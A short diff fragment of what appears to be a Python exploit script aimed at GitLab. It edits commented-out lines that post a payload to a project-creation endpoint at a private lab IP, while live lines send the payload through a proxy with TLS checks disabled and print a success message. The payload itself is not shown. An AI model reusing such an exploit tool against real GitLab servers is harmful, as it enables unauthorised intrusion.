@@ -191,7 +191,7 @@ elif (http_server=="Y") or (http_server=="y"):
 
 
 
-		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)
+		#response = request.post('http://10.129.49.31:5080/projects',data=payload,cookies=cookies,headers=headers,verify=False)
 
 		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,proxies=proxies,headers=headers,verify=False)
 		print("[+] Success!")
@@ -254,7 +254,7 @@ elif (http_server=="Y") or (http_server=="y"):
 
 
 
-		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)
+		#response = request.post('http://10.129.49.31:5080/projects',data=payload,cookies=cookies,headers=headers,verify=False)
 
 		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,proxies=proxies,headers=headers,verify=False)
 		print("[+] Success!")
